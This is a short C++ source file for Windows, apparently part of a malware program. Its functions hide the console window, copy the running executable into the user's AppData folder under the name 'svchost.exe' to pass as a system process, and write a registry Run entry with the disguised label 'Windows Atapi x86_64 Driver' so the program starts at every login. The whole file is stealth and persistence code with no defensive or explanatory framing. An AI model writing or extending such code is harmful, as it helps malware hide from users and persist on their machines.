#define _WIN32_WINNT 0x500
#include <windows.h>
#include <string>
#include <iostream>

using namespace std;

void HideConsole()
{
    HWND hWnd = GetConsoleWindow(); 
    ShowWindow(hWnd, SW_HIDE);
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
    FreeConsole(); 
}

string getEnvVar(const char* varName) {
    char* buffer = nullptr;
    size_t size = 0;
    if (_dupenv_s(&buffer, &size, varName) == 0 && buffer != nullptr) {
        string value(buffer);
        free(buffer);
        return value;
    }
    return "";
}

string userlc = getEnvVar("APPDATA");

void CopyToAppdata()
{
    string f_path = userlc;
    string f_name = f_path + "\\svchost.exe";  
    char my_name[MAX_PATH];
    GetModuleFileNameA(NULL, my_name, MAX_PATH);

    CreateDirectoryA(f_path.c_str(), NULL);     
    CopyFileA(my_name, f_name.c_str(), FALSE);
}

void RunAtStartup()
{
    char Driver[MAX_PATH];
    HKEY hKey;
    string ff_path = userlc + "\\svchost.exe";
    strcpy_s(Driver, ff_path.c_str());

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ,
            (const BYTE*)Driver, (DWORD)(strlen(Driver) + 1));
        RegCloseKey(hKey);
    }
    else
    {
        cout << "Failed to open registry key for AutoStart\n";
    }
}
